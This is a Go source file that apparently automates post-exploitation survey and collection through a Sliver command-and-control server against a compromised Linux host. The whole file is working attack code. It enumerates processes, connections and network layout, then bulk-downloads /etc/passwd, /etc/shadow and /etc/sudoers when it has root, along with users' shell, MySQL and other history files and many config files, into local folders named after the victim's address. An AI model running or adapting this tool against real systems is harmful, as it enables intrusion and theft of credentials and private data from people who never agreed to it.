package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"bytes"
	"io"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
	"github.com/bishopfox/sliver/client/console"
	"github.com/jedib0t/go-pretty/v6/table"
	"compress/gzip"
	"log"
	"github.com/bishopfox/sliver/client/assets"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util"
	"google.golang.org/grpc"
)

// Function to make a request to the sliver server
//
// :param: session *clientpb.Session -> the target session we are interacting with
// :return: *commonpb.Request -> the response from the server
func makeRequest(session *clientpb.Session) *commonpb.Request {
	if session == nil {
		return nil
	}
	timeout := int64(60)
	return &commonpb.Request{
		SessionID: session.ID,
		Timeout:   timeout,
	}
}

// Function to make border separator between our survey sections
//
// :param: header string -> the title for our header
// :return: none
func makeBorder(header string) {
	fmt.Printf("%v\n", strings.Repeat("=", 70))
	fmt.Printf("[*] %v\n", header)
	fmt.Printf("%v\n", strings.Repeat("=", 70))
}

// Function to make the connection from our device to the sliver server
//
// :param: configPath *string -> the path to our client config that will auth us to the sliver server
// :return: *clientpb.Sessions -> the active sliver session that we will be interacting with 
// :return: rpcpb.SliverRPCClient -> the rpc client object that will allow us to make command requests to the server
// :return: *grpc.ClientConn -> the connection object to the sliver server
func makeConnection(configPath *string) (*clientpb.Sessions, rpcpb.SliverRPCClient, *grpc.ClientConn) {
	// load the client configuration from the filesystem
	config, err := assets.ReadConfig(*configPath)
	if err != nil {
		fmt.Println("[!] Failed to read config:", err)
	}
	// connect to the server
	rpc, ln, err := transport.MTLSConnect(config)

	if err != nil {
		log.Fatal(err)
	}
	log.Println("[*] Connected to sliver server")

	// get active sliver sessions connected to the server
	sessions, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		fmt.Println("[!] Failed to get sessions", err)
	}
	return sessions, rpc, ln
}

// Function to get the ip interfaces of the target device
// Stole alot of the Print function from the real sliver client https://github.com/BishopFox/sliver/blob/master/client/command/network/ifconfig.go
//
// :param: targetSession *clientpb.Session -> the target session we are interacting with 
// :param: rpc rpcpb.SliverRPCClient -> the rpc object allowing us to make command request
// :return: None
func getInterfaces(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient) {

	interfaces, err := rpc.Ifconfig(context.Background(), &sliverpb.IfconfigReq{
		Request: makeRequest(targetSession),
	})
	if err != nil {
		fmt.Println(err)
	}

	hidden := 0
	for index, iface := range interfaces.NetInterfaces {
		tw := table.NewWriter()
		//tw.SetStyle(settings.GetTableWithBordersStyle(con))
		tw.SetTitle(fmt.Sprintf(console.Bold+"%s"+console.Normal, iface.Name))
		tw.SetColumnConfigs([]table.ColumnConfig{
			{Name: "#", AutoMerge: true},
			{Name: "IP Address", AutoMerge: true},
			{Name: "MAC Address", AutoMerge: true},
		})
		rowConfig := table.RowConfig{AutoMerge: true}
		tw.AppendHeader(table.Row{"#", "IP Addresses", "MAC Address"}, rowConfig)
		macAddress := ""
		if 0 < len(iface.MAC) {
			macAddress = iface.MAC
		}
		ips := []string{}
		for _, ip := range iface.IPAddresses {
			// Try to find local IPs and colorize them
			subnet := -1
			if strings.Contains(ip, "/") {
				parts := strings.Split(ip, "/")
				subnetStr := parts[len(parts)-1]
				subnet, err = strconv.Atoi(subnetStr)
				if err != nil {
					subnet = -1
				}
			}
			if 0 < subnet && subnet <= 32 && !isLoopback(ip) {
				ips = append(ips, ip)
			}
		}
		if len(ips) < 1 {
			hidden++
			continue
		}
		if 0 < len(ips) {
			for _, ip := range ips {
				tw.AppendRow(table.Row{iface.Index, ip, macAddress}, rowConfig)
			}
		} else {
			tw.AppendRow(table.Row{iface.Index, " ", macAddress}, rowConfig)
		}
		fmt.Printf("%s\n", tw.Render())
		if index+1 < len(interfaces.NetInterfaces) {
			fmt.Println()
		}
	}

}

// Function to determine if an address is a loopback or not 
// Copied from the actual sliver client https://github.com/BishopFox/sliver/blob/master/client/command/network/ifconfig.go
//
// :param: the ip to check if its a loopback or not 
// :return: bool true or false 
func isLoopback(ip string) bool {
	if strings.HasPrefix(ip, "127") || strings.HasPrefix(ip, "::1") {
		return true
	}
	return false
}


// Function that will provide us a listing of a directory without processing the results for the end user
// provides us an ability to get a directory listing and then take other actions w/o presenting data to the user
// used for mass download requests for grabbing files of interest
//
// :param: targetSession *clientpb.Session -> the target session we are interacting with 
// :param: rpc rpcpb.SliverRPCClient -> the rpc object allowing us to make command request
// :param: path string -> the path of the target system we are getting a directory list of i.e. "/home/ubuntu"
// :return: []*sliverpb.FileInfo -> the files and directories from the target system in this specific directory 
func rawListDirectory(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, path string) []*sliverpb.FileInfo {
	ls, err := rpc.Ls(context.Background(), &sliverpb.LsReq{
		Path:    path,
		Request: makeRequest(targetSession),
	})
	if err != nil {
		fmt.Println(err)
	}
	if ls.Response != nil && ls.Response.Err != "" {
		log.Fatal(ls.Response.Err)
	}
	return ls.Files
}

// Function to find all the history files on the target system. Function is limited to the history files we are searching for 
// will auto download all the target history files speeding up enumeration and collection of files from the target system 
//
// :param: targetSession *clientpb.Session -> the target session we are interacting with 
// :param: rpc rpcpb.SliverRPCClient -> the rpc object allowing us to make command request
// :param: fileTag string -> the file tag is the ip:port of the target machine we use this as the root directory of all collected files 
// for example to get /etc/passwd the download path will be target_ip:port/etc/passwd locally we rebuild the target directory structure locally 
// :param: targetPath string -> the target path to list and then search for i.e. /home/ubuntu, /home/otheruser
// :return: None
func findHistoriesUser(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, fileTag string, targetPath string) {
	files := rawListDirectory(targetSession, rpc, targetPath)
	var directories []string
	for _, fi := range files {
		directories = append(directories, fi.Name)
	}

	histFiles := []string{".zsh_history", ".bash_history", ".ash_history", ".cshrc_history", ".ksh_history", ".fish_history", ".dash_history",
			".sqlite_history", ".wget-hsts", ".viminfo", ".mysql_history", ".lesshst", ".gitconfig", ".bashrc", ".zshrc"}
	for _, i := range directories {
		fullHomePath := fmt.Sprintf("/home/" + i)
		homeDirectory := rawListDirectory(targetSession, rpc, fullHomePath)
		for _, history := range homeDirectory {
			partialPath := fmt.Sprintf(fullHomePath + "/")
			for _, histFile := range histFiles {
				if history.Name == histFile {
					fullPath := fmt.Sprintf(partialPath + history.Name)
					downloadFile(targetSession, rpc, fullPath, fileTag, true, false)
				}
			}
		}
	}
}

func findHistoriesRoot(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, fileTag string, targetPath string) {
	rootFiles := rawListDirectory(targetSession, rpc, targetPath)

	histFiles := []string{".zsh_history", ".bash_history", ".ash_history", ".cshrc_history", ".ksh_history", ".fish_history", ".dash_history",
			".sqlite_history", ".wget-hsts", ".viminfo", ".mysql_history", ".lesshst", ".gitconfig", ".bashrc", ".zshrc"}
	for _, i := range rootFiles {
		for _, histFile := range histFiles {
			if i.Name == histFile {
				fullPath := fmt.Sprintf("/root/" + histFile)
				downloadFile(targetSession, rpc, fullPath, fileTag, true, false)	
			}
		}
	}
}

func processList(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient) {
	makeBorder("Process List")

	ps, err := rpc.Ps(context.Background(), &sliverpb.PsReq{
		Request: makeRequest(targetSession),
	})
	if err != nil {
		fmt.Println(err)
	}
	tw := table.NewWriter()
    tw.AppendHeader(table.Row{"PPID", "PID", "User", "Command"})
	tw.AppendHeader(table.Row{"======", "====", "=====", "========="})

	for _, proc := range ps.Processes {
		row := procRow(proc, true)
		tw.AppendRow(row)
	}
	tw.SetColumnConfigs([]table.ColumnConfig{
        {Name: "PPID", WidthMin: 10},
        {Name: "PID", WidthMin: 10},
        {Name: "User", WidthMin: 15},
        {Name: "Command", WidthMin: 30},
    })

    // Styling to remove unnecessary borders
    tw.Style().Options.SeparateRows = false
    tw.Style().Box = table.BoxStyle{
		TopSeparator: 	 "",
		BottomSeparator: "",
        Left:            "",
        Right:           "",
        TopLeft:         "",
        TopRight:        "",
        BottomLeft:      "",
        BottomRight:     "",
        MiddleHorizontal: "",
        MiddleVertical:   "",
        PaddingLeft:      " ",
        PaddingRight:     " ",
    }

    tw.SortBy([]table.SortBy{
        {Name: "PID", Mode: table.AscNumeric},
        {Name: "PPID", Mode: table.AscNumeric},
    })

	for _, line := range strings.Split(tw.Render(), "\n") {
		fmt.Printf("%s\n", strings.TrimSpace(line)) // Trim spaces for each line
	}
}

func procRow(proc *commonpb.Process, cmdLine bool) table.Row {
	var row table.Row
	if cmdLine {
		var args string
		if len(proc.CmdLine) >= 2 {
			args = strings.Join(proc.CmdLine, " ")
		} else {
			args = proc.Executable
		}
		row = table.Row{
			fmt.Sprintf("%d"+console.Normal, proc.Pid),
			fmt.Sprintf("%d"+console.Normal, proc.Ppid),
			fmt.Sprintf("%s"+console.Normal, proc.Owner),
			fmt.Sprintf("%s"+console.Normal, args),
			
		}
	} else {
		row = table.Row{
			fmt.Sprintf("%d"+console.Normal, proc.Pid),
			fmt.Sprintf("%d"+console.Normal, proc.Ppid),
			fmt.Sprintf("%s"+console.Normal, proc.Owner),
			fmt.Sprintf("%s"+console.Normal, proc.Executable),
		}
	}
	return row
}

func FormatDateDelta(t time.Time, includeDate bool) string {
	nextTime := t.Format(time.UnixDate)

	var interval string

	if t.Before(time.Now()) {
		if includeDate {
			interval = fmt.Sprintf("%s (%s ago)", nextTime, time.Since(t).Round(time.Second))
		} else {
			interval = time.Since(t).Round(time.Second).String()
		}
	} else {
		if includeDate {
			interval = fmt.Sprintf("%s (in %s)", nextTime, time.Until(t).Round(time.Second))
		} else {
			interval = time.Until(t).Round(time.Second).String()
		}
	}
	return interval
}

func getInfo(targetSession *clientpb.Session) {
	makeBorder("Session Information")
	fmt.Printf(console.Bold+"        Session ID: %s%s\n", console.Normal, targetSession.ID)
	fmt.Printf(console.Bold+"              Name: %s%s\n", console.Normal, targetSession.Name)
	fmt.Printf(console.Bold+"          Hostname: %s%s\n", console.Normal, targetSession.Hostname)
	fmt.Printf(console.Bold+"              UUID: %s%s\n", console.Normal, targetSession.UUID)
	fmt.Printf(console.Bold+"          Username: %s%s\n", console.Normal, targetSession.Username)
	fmt.Printf(console.Bold+"               UID: %s%s\n", console.Normal, targetSession.UID)
	fmt.Printf(console.Bold+"               GID: %s%s\n", console.Normal, targetSession.GID)
	fmt.Printf(console.Bold+"               PID: %s%d\n", console.Normal, targetSession.PID)
	fmt.Printf(console.Bold+"                OS: %s%s\n", console.Normal, targetSession.OS)
	fmt.Printf(console.Bold+"           Version: %s%s\n", console.Normal, targetSession.Version)
	fmt.Printf(console.Bold+"              Arch: %s%s\n", console.Normal, targetSession.Arch)
	fmt.Printf(console.Bold+"         Active C2: %s%s\n", console.Normal, targetSession.ActiveC2)
	fmt.Printf(console.Bold+"    Remote Address: %s%s\n", console.Normal, targetSession.RemoteAddress)
	fmt.Printf(console.Bold+"         Proxy URL: %s%s\n", console.Normal, targetSession.ProxyURL)
	fmt.Printf(console.Bold+"Reconnect Interval: %s%s\n", console.Normal, time.Duration(targetSession.ReconnectInterval).String())
	fmt.Printf(console.Bold+"      Last Checkin: %s%s\n", console.Normal, FormatDateDelta(time.Unix(targetSession.LastCheckin, 0), true))

}


func getConnections(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient) {
	makeBorder("Connections")
	netstat, err := rpc.Netstat(context.Background(), &sliverpb.NetstatReq{
		TCP: true,
		UDP: true,
		IP4: true,
		IP6: true,
		Listening: true,
		Request: makeRequest(targetSession),
	})
	if err != nil {
		fmt.Println(err)
	}

	tw := table.NewWriter()
	tw.AppendHeader(table.Row{"Protocol", "Local Address", "Foreign Address", "State", "PID/Program name"})

	for _, entry := range netstat.Entries {
		pid := ""
		if entry.Process != nil {
			pid = fmt.Sprintf("%d/%s", entry.Process.Pid, entry.Process.Executable)
		}
		srcAddr := fmt.Sprintf("%s:%d", entry.LocalAddr.Ip, entry.LocalAddr.Port)
		dstAddr := fmt.Sprintf("%s:%d", entry.RemoteAddr.Ip, entry.RemoteAddr.Port)

		if entry.Process.Pid == targetSession.PID {
			tw.AppendRow(table.Row{
				fmt.Sprintf(console.Green+"%s"+console.Normal, entry.Protocol),
				fmt.Sprintf(console.Green+"%s"+console.Normal, srcAddr),
				fmt.Sprintf(console.Green+"%s"+console.Normal, dstAddr),
				fmt.Sprintf(console.Green+"%s"+console.Normal, entry.SkState),
				fmt.Sprintf(console.Green+"%s"+console.Normal, pid),
			})
		} else {
			tw.AppendRow(table.Row{entry.Protocol, srcAddr, dstAddr, entry.SkState, pid})
		}		
	}
	fmt.Printf("%s\n", tw.Render())
}

// Function to list directory on a target system 
//
// :param: targetSession *clientpb.Session -> the target session we are interacting with 
// :param: rpc rpcpb.SliverRPCClient -> the rpc object allowing us to make command request
// :param: path string -> the target directory path to list files and directories
// :return: None
func listDirectory(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, path string) {
	ls, err := rpc.Ls(context.Background(), &sliverpb.LsReq{
		Path:    path,
		Request: makeRequest(targetSession),
	})

	if err != nil {
		fmt.Println(err)
	}
	if ls.Response != nil && ls.Response.Err != "" {
		log.Fatal(ls.Response.Err)
	}

	numberOfFiles := len(ls.Files)
	var totalSize int64 = 0
	var pathInfo string

	for _, fileInfo := range ls.Files {
		totalSize += fileInfo.Size
	}

	if numberOfFiles == 1 {
		pathInfo = fmt.Sprintf("%s (%d item, %s)", ls.Path, numberOfFiles, util.ByteCountBinary(totalSize))
	} else {
		pathInfo = fmt.Sprintf("%s (%d items, %s)", ls.Path, numberOfFiles, util.ByteCountBinary(totalSize))
	}

	header := fmt.Sprintf("Path Info: %v", pathInfo)
	makeBorder(header)

	for _, fileInfo := range ls.Files {
		modTime := time.Unix(fileInfo.ModTime, 0)
		implantLocation := time.FixedZone(ls.Timezone, int(ls.TimezoneOffset))
		modTime = modTime.In(implantLocation)

		fmt.Printf("%-13s %-13d %-32s %-20s\n",
			fileInfo.Mode, fileInfo.Size, modTime, fileInfo.Name)
	}
}


func downloadFile(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, path string, fileTag string, quiet bool, view bool) {

	download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Path:    path,
		Request: makeRequest(targetSession),
	})

	if !quiet {
		header := fmt.Sprintf("Download Request: %v", path)
		makeBorder(header)
	}

	if err != nil {
		// error occured, what was the error
		// ensure that the error has a : in it before trying to parse the error
		if strings.Contains(err.Error(), ":") {
			// get only the content after the : we know it exists in the error string
			errString := strings.Split(err.Error(), ":")
			if len(errString) >= 3 && strings.TrimSpace(errString[2]) == "no such file or directory" {
				fmt.Println("[!] No such file or directory:", path)
			} else {
				fmt.Println("[!] Unexpected error:", errString)
			}
		}
	}
	rebuildDirs(path, fileTag)

	if download != nil {
		if download.Exists {
			if download.Encoder == "gzip" {
				dataBytes := []byte(download.Data)

				// Create a gzip reader
				gzipReader, err := gzip.NewReader(bytes.NewReader(dataBytes))
				if err != nil {
					fmt.Println("[!] Error creating gzip reader:", err)
					return
				}
				defer gzipReader.Close()

				// Decompress the data
				var decompressedData bytes.Buffer
				_, err = io.Copy(&decompressedData, gzipReader)
				if err != nil {
					fmt.Println("[!] Error decompressing data:", err)
					return
				}

				// Convert decompressed data to string or use it as bytes
				fullPath := fmt.Sprintf(fileTag + "/" + path)

				file, err := os.OpenFile(fullPath, os.O_CREATE|os.O_WRONLY, 0777)
				if err != nil {
					fmt.Println("[!] Error creating file:", err)
					return
				}
				defer file.Close()

				_, err = file.WriteString(decompressedData.String())
				if err != nil {
					fmt.Println("[!] Error writing data to file:", err)
					return
				}
				if !quiet {
					fmt.Println("[*] Download Successful:", path)
				}

				if view {
					file, err := os.OpenFile(fullPath, os.O_RDONLY, 0777)
					if err != nil {
						fmt.Println("[!] Error creating file:", err)
						return
					}
					defer file.Close()
					scanner := bufio.NewScanner(file)
					for scanner.Scan() {
						fmt.Println(scanner.Text())
					}
					if err := scanner.Err(); err != nil {
						log.Fatalf("[!] Error reading file: %v", err)
					}
				}
			}
		}
	} else {
		return
	}
}

func rebuildDirs(path string, fileTag string) {
	pathParts := strings.Split(path, "/")

	_, err := os.Stat(fileTag)
	if os.IsNotExist(err) {
		os.Mkdir(fileTag, 0777)
	}
	// we know the filetag already exists walk down the pathParts
	pathTrack := []string{fileTag}

	for index, line := range pathParts {
		if index == len(pathParts)-1 {
			break
		}

		dir := strings.Join(pathTrack, "/") + "/" + line
		_, err = os.Stat(dir)
		if os.IsNotExist(err) {
			err = os.Mkdir(dir, 0777)
			if err != nil {
				fmt.Println("Error creating directory:", err)
				return
			}
		}
		pathTrack = append(pathTrack, line)
	}
}

func executeBinary(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, path string, args []string, quiet bool) {
	var stdout string
	var stderr string
	execute, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
		Path: path,
		Args: args,
		Output: true,
		Stdout: stdout,
		Stderr: stderr,
		Request: makeRequest(targetSession),
	})

	if !quiet {
		header := fmt.Sprintf("Execute Binary: %v %v", path, strings.Join(args, " "))
		makeBorder(header)
	}

	if err != nil {
		// error occured, what was the error
		// ensure that the error has a : in it before trying to parse the error
		if strings.Contains(err.Error(), ":") {
			// get only the content after the : we know it exists in the error string
			errString := strings.Split(err.Error(), ":")
			if len(errString) >= 3 && strings.TrimSpace(errString[2]) == "no such file or directory" {
				fmt.Println("[!] No such file or directory:", path)
			} else {
				fmt.Println("[!] Unexpected error:", errString)
			}
		}
	}
	// exit status
	if execute != nil {
		if execute.Status == 0 {
			fmt.Println(formatExecuteOutput(string(execute.Stdout)))
		} else {
			// something went wrong with our exit status, lets figure out what 
			fmt.Println(formatExecuteOutput(string(execute.Stderr)))
		}
	}
}

func formatExecuteOutput(rawOutput string) string {
	var formattedLines []string
	lines := strings.Split(rawOutput, "\n")
	formattedLines = append(formattedLines, lines...)
	return strings.Join(formattedLines, "\n")
}

// Function will auto download any file that matches regex /etc/*.conf
//
// :param: targetSession *clientpb.Session -> the target session we are interacting with 
// :param: rpc rpcpb.SliverRPCClient -> the rpc object allowing us to make command request
// :param: fileTag string -> the file tag is the ip:port of the target machine we use this as the root directory of all collected files 
// for example to get /etc/passwd the download path will be target_ip:port/etc/passwd locally we rebuild the target directory structure locally 
func getEctConf(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, fileTag string) {
	makeBorder("Grabbing files /etc/*.conf")
	allEtcConf := rawListDirectory(targetSession, rpc, "/etc/*.conf")
	for _, fi := range allEtcConf {
		if !fi.IsDir {
			fullPath := fmt.Sprintf("/etc/" + fi.Name)
			downloadFile(targetSession, rpc, fullPath, fileTag, true, false)
		}
	}
}

// Function will auto download any file that matches regex /etc/systemd/*.conf
//
// :param: targetSession *clientpb.Session -> the target session we are interacting with 
// :param: rpc rpcpb.SliverRPCClient -> the rpc object allowing us to make command request
// :param: fileTag string -> the file tag is the ip:port of the target machine we use this as the root directory of all collected files 
// for example to get /etc/passwd the download path will be target_ip:port/etc/passwd locally we rebuild the target directory structure locally 
func getSystemdConf(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, fileTag string) {
	makeBorder("Grabbing files /etc/systemd/*.conf")
	allSystemdConf := rawListDirectory(targetSession, rpc, "/etc/systemd/*.conf")
	for _, fi := range allSystemdConf {
		if !fi.IsDir {
			fullPath := fmt.Sprintf("/etc/systemd/" + fi.Name)
			downloadFile(targetSession, rpc, fullPath, fileTag, true, false)
		}
	}
}

// Function will auto download any file that matches regex /lib/systemd/system/*
//
// :param: targetSession *clientpb.Session -> the target session we are interacting with 
// :param: rpc rpcpb.SliverRPCClient -> the rpc object allowing us to make command request
// :param: fileTag string -> the file tag is the ip:port of the target machine we use this as the root directory of all collected files 
// for example to get /etc/passwd the download path will be target_ip:port/etc/passwd locally we rebuild the target directory structure locally 
func getLibSystemdSystem(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, fileTag string) {
	makeBorder("Grabbing files /lib/systemd/system/*")
	files := rawListDirectory(targetSession, rpc, "/lib/systemd/system")
	for _, fi := range files {
		if !fi.IsDir {
			fullPath := fmt.Sprintf("/lib/systemd/system/" + fi.Name)
			downloadFile(targetSession, rpc, fullPath, fileTag, true, false)
		}
	}
}

// Function handles when multiple sessions are active on the sliver server
//
// :param: sessions []*clientpb.Session -> an array of active sessions connected to the sliver server
// :return: *clientpb.Session -> the client session the operator wishes to connect to 
func handleMultipleSessions(sessions []*clientpb.Session) *clientpb.Session {
	fmt.Println("[+] Multiple Sessions Detected [+]")
	fmt.Println("[+] Which session should this module be run against:")

	tw := table.NewWriter()
	tw.SetTitle(fmt.Sprintf(console.Bold+"%s"+console.Normal, "Sessions"))
	tw.SetColumnConfigs([]table.ColumnConfig{
		{Name: "#", AutoMerge: true},
		{Name: "ID", AutoMerge: true},
		{Name: "Hostname", AutoMerge: true},
		{Name: "Remode Address", AutoMerge: true},
	})
	rowConfig := table.RowConfig{AutoMerge: true}
	tw.AppendHeader(table.Row{"#","ID", "Hostname", "Remote Address"}, rowConfig)

	var totalSessions []int
	for index, i := range sessions {
		tw.AppendRow(table.Row{index, i.ID, i.Hostname, i.RemoteAddress}, rowConfig)
		totalSessions = append(totalSessions, index)
	}
	fmt.Printf("%s\n", tw.Render())

	for {
		scanner := bufio.NewScanner(os.Stdin)
		fmt.Printf(">>> ")
		scanner.Scan()
		sessionSelection := scanner.Text()
		if err := scanner.Err(); err != nil {
			fmt.Println("[!] Error reading input:", err)
		}
		// convert to int 
		sessionSelectionInt, err := strconv.Atoi(sessionSelection)
		if err != nil {
			fmt.Println("[!] Invalid selection")
			// reloop user is not entering ints 
			continue
		}
		if sessionSelectionInt >= 0 && sessionSelectionInt < len(totalSessions) {
			return sessions[sessionSelectionInt]
		} else {
			fmt.Println("[!] Invalid selection")
		}	
	}
}

func resolveBpf(bpfValue string) string {
	bpfValues := map[int]string{
		0: "Unrestricted access -> Unprivileged users (non-root) are allowed to load BPF programs and maps without restrictions",
		1: "BPF is restricted for unprivileged users -> Unprivileged users are completely prohibited from loading BPF programs or creating BPF maps",
		2: "Permanently disable unprivileged BPF -> Unprivileged BPF usage is permanently disabled",
	}
	bpfValueInt, _ := strconv.Atoi(bpfValue)
	for key, value := range bpfValues {
		if key == bpfValueInt {
			return value
		}
	}
	return "Value not found"
}

func resolvePtrace(ptraceValue string) string {
	ptraceValues := map[int]string{
        0: "No restrictions -> Any process can attach to another process that it has the appropriate permissions for",
        1: "Restricted to parent processes -> Process can attach to its child processes",
        2: "Admin-only debugging -> Normal users cannot use ptrace, even on their own child processes, unless explicitly granted the capability",
		3: "No ptrace -> This is suitable for systems where debugging and process introspection are entirely unnecessary or prohibited",
    }
	ptraceValueInt, _ := strconv.Atoi(ptraceValue)
	for key, value := range ptraceValues {
		if key == ptraceValueInt {
			return value
		}
	}
	return "Value not found"
}

func readFileAsString(filename string) (string, error) {
	// Read the entire file into memory
	data, err := os.ReadFile(filename)
	if err != nil {
		return "", err
	}
	// Convert the file data (bytes) into a string
	return string(data), nil
}

func taintScript(val string) {
	scriptPath := "./taint.sh" // Replace with the path to your script
	arg := val

	// Create a command to execute the script with the argument
	cmd := exec.Command(scriptPath, arg)

	// Capture the output (both stdout and stderr)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Error executing script: %v\n", err)
		return
	}

	// Print the output from the script
	fmt.Println(string(output))
}

func binExists(targetSession *clientpb.Session, rpc rpcpb.SliverRPCClient, path string) bool {
	exists := rawListDirectory(targetSession, rpc, path)
	if (len(exists) == 1) {
		return true
	}
	return false
}

func main() {
	var configPath string
	flag.StringVar(&configPath, "config", "", "path to sliver client config file")
	flag.Parse()

	if configPath == "" {
		fmt.Println("[!] Specify a client config to load")
		os.Exit(1)
	}

	sessions, rpc, ln := makeConnection(&configPath)
	defer ln.Close()

	//targetSession := sessions.Sessions[0]
	// targetSession := sessions.Sessions[0]
	var targetSession *clientpb.Session
	//fmt.Println(sessions)
	//fmt.Println(len(sessions.Sessions))
	if len(sessions.Sessions) > 1 {
		// need to handle multiple clients connected
		targetSession = handleMultipleSessions(sessions.Sessions)
		
	} else {
		targetSession = sessions.Sessions[0]
	}

	fileTag := targetSession.RemoteAddress // THIS IS YOUR FILE DIR TAG

	getInfo(targetSession)

	makeBorder("System Info")
	if binExists(targetSession, rpc, "/usr/bin/uptime") {
		fmt.Println(console.Bold+"Uptime:"+console.Normal)
		executeBinary(targetSession, rpc, "/usr/bin/uptime", []string{}, true)
	}
	if binExists(targetSession, rpc, "/usr/bin/cat") {
		fmt.Println(console.Bold+"Distro:"+console.Normal)
		executeBinary(targetSession, rpc, "/usr/bin/cat", []string{"/etc/os-release"}, true)
	}
	if binExists(targetSession, rpc, "/usr/bin/uname") {
		fmt.Println(console.Bold+"Kernel Release:"+console.Normal)
		executeBinary(targetSession, rpc, "/usr/bin/uname", []string{"-r"}, true)
		fmt.Println(console.Bold+"Arch:"+console.Normal)
		executeBinary(targetSession, rpc, "/usr/bin/uname", []string{"-m"}, true)
	}
	if binExists(targetSession, rpc, "/usr/bin/grep") {
		fmt.Println(console.Bold+"System Memory"+console.Normal)
		executeBinary(targetSession, rpc, "/usr/bin/grep", []string{"-E", "MemTotal|MemAvailable|MemFree", "/proc/meminfo"}, true)
	}

	processList(targetSession, rpc)
	getConnections(targetSession, rpc)

	listDirectory(targetSession, rpc, "/")
	if targetSession.GID == "0" {
		listDirectory(targetSession, rpc, "/root")
	}


	// grab files from /etc
	makeBorder("Grabbing files /etc/")
	downloadFile(targetSession, rpc, "/etc/passwd", fileTag, true, false)
	downloadFile(targetSession, rpc, "/etc/hosts", fileTag, true, false)
	downloadFile(targetSession, rpc, "/etc/os-release", fileTag, true, false)
	downloadFile(targetSession, rpc, "/etc/hosts.allow", fileTag, true, false)
	downloadFile(targetSession, rpc, "/etc/hosts.deny", fileTag, true, false)
	downloadFile(targetSession, rpc, "/etc/rsyslog.conf", fileTag, true, false)
	downloadFile(targetSession, rpc, "/etc/ssh/sshd_config", fileTag, true, false)
	downloadFile(targetSession, rpc, "/etc/crontab", fileTag, true, false)
	downloadFile(targetSession, rpc, "/etc/hostname", fileTag, true, false)

	if targetSession.GID == "0" {
		downloadFile(targetSession, rpc, "/etc/shadow", fileTag, true, false)
		downloadFile(targetSession, rpc, "/etc/sudoers", fileTag, true, false)
	}

	makeBorder("Grabbing history files")
	findHistoriesUser(targetSession, rpc, fileTag, "/home")
	if targetSession.GID == "0" {
		findHistoriesRoot(targetSession, rpc, fileTag, "/root")
	}

	getEctConf(targetSession, rpc, fileTag)
	getSystemdConf(targetSession, rpc, fileTag)
	getLibSystemdSystem(targetSession, rpc, fileTag)

	makeBorder("Interfaces")
	getInterfaces(targetSession, rpc)
	makeBorder("Arp")
	executeBinary(targetSession, rpc, "/usr/bin/cat", []string{"/proc/net/arp"}, true)
	makeBorder("Routing Table")
	executeBinary(targetSession, rpc, "/usr/sbin/route", []string{"-n"}, true)

	makeBorder("Checking: /proc/sys/kernel/yama/ptrace_scope")
	downloadFile(targetSession, rpc, "/proc/sys/kernel/yama/ptrace_scope", fileTag, true, true)
	ptraceScope, _ := readFileAsString(fileTag+"/proc/sys/kernel/yama/ptrace_scope")
	ptraceValue := resolvePtrace(ptraceScope)
	fmt.Println(ptraceValue)

	makeBorder("Checking: /proc/sys/kernel/tainted")
	downloadFile(targetSession, rpc, "/proc/sys/kernel/tainted", fileTag, true, true)
	taintedValue, _ := readFileAsString(fileTag+"/proc/sys/kernel/tainted")
	taintScript(taintedValue)
	
	makeBorder("Checking: /proc/sys/kernel/unprivileged_bpf_disabled")
	downloadFile(targetSession, rpc, "/proc/sys/kernel/unprivileged_bpf_disabled", fileTag, true, true)
	bpfValue, _ := readFileAsString(fileTag+"/proc/sys/kernel/unprivileged_bpf_disabled")
	bpfDecoded := resolveBpf(bpfValue)
	fmt.Println(bpfDecoded)

}
